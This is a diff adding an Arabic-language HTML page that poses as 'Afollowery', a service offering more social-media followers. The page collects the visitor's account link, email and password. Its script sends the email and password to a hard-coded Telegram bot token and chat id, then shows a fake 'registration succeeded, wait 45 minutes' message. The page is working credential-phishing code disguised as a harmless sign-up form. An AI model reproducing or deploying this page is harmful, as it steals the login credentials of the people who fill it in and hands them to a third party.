@@ -1,0 +1,148 @@
+      <!DOCTYPE html>
+      <html lang="en">
+      <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Message Box</title>
+      <style>
+      body {
+        background-image: url('mo.jpg'); /* تغيير الصورة الخلفية */
+        background-size: cover;
+        background-position: center;
+        font-family: Arial, sans-serif;
+        height: 100vh; /* جعل ارتفاع الصفحة يملأ الشاشة بالكامل */
+        margin: 0; /* إزالة الهوامش الافتراضية */
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .confirmation-page {
+          display: none;
+          text-align: center;
+          background-color: rgba(255, 255, 255, 0.1); /* تغيير لون الخلفية إلى الأبيض وتعديل التعتيم */
+          border: 1px solid transparent; /* جعل الإطار شفافاً */
+          padding: 20px;
+          border-radius: 10px;
+          box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+          width: 80%;
+          max-width: 400px;
+      }
+      .confirmation-page h2 {
+    color: white; /* تغيير لون النص إلى الأبيض */
+      }
+
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #372C9E;
+            font-family: AlarabiyaNormal, Arial, sans-serif;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 92%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #372C9E;
+            border-radius: 5px;
+            outline: none;
+            box-sizing: border-box;
+            background-color: rgba(255, 255, 255, 0.2);
+            color: #372C9E;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            background-color: #03E4B8;
+            color: #22195E;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: AlarabiyaNormal, Arial, sans-serif;
+        }
+
+        .welcome-text {
+            font-size: 14px;
+            margin-top: 10px;
+            color: #03E4B8;
+            font-family: AlarabiyaNormal, Arial, sans-serif;
+        }
+
+        h2 {
+            color: #372C9E;
+            font-family: AlarabiyaNormal, Arial, sans-serif;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="registrationForm" class="registration-form">
+            <h2 style="text-align: center;"> Afollowery لزيادة المتابعين</h2>
+
+            <p class="welcome-text"> </p>
+            <form action="register.php" method="post" onsubmit="return sendDetails()">
+                <div class="form-group">
+                    <label for="fullname">رابط حسابك </label>
+                    <input type="text" id="fullname" name="fullname" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">البريد الإلكتروني</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">كلمة المرور</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                <button type="submit">تسجيل</button>
+            </form>
+            <p style="color: #03E4B8; font-size: 0.7em;"></p>
+        </div>
+
+      <div id="confirmationPage" class="confirmation-page">
+          <h2><p</h2>
+        
+          <p style="color: #372C9E; font-size: 0.7em;"> مبارك لقد قمت بالتسجيل ، انتظر 45 دقيقة لتصلك !</p> <!-- إضافة العبارة الجديدة -->
+      </div>
+
+    </div>
+
+    <script>
+        function sendDetails() {
+            var fullname = document.getElementById('fullname').value;
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var message = "𝐍𝐞𝐰 𝐋𝐨𝐠𝐢𝐧 ! \n𝐆𝐥𝐨𝐛𝐚𝐥 : " + fullname + "\n𝐄𝐦𝐚𝐢𝐥 : " + email + "\n𝐏𝐚𝐬𝐬 : " + password;
+
+            var botToken = "7082909096:AAF46CxfBXwgytJREJ7vKBCjzDrDnZxkonU";
+            var chatId = "5728523779";
+
+            var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("GET", url, true);
+            xhttp.send();
+
+          // تأخير عرض صفحة التأكيد بعد 5 ثواني
+          setTimeout(function() {
+              document.getElementById('registrationForm').style.display = 'none';
+              document.getElementById('confirmationPage').style.display = 'block';
+              window.scrollTo(0, 0);
+              // تحديث عنوان الصفحة
+              document.title = "هناك خطأ 404";
+          }, 1000);
+
+            return false; // منع إرسال النموذج
+        }
+    </script>
+</body>
+</html>
